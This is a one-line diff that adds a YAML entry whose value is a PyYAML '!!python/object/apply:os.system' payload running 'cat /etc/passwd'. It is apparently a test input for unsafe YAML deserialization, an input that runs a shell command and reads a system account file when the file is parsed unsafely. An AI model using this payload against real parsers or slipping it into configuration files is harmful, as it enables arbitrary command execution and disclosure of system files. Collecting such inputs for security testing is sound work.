@@ -1,0 +1,1 @@
+str_: !!python/object/apply:os.system ["cat /etc/passwd"]
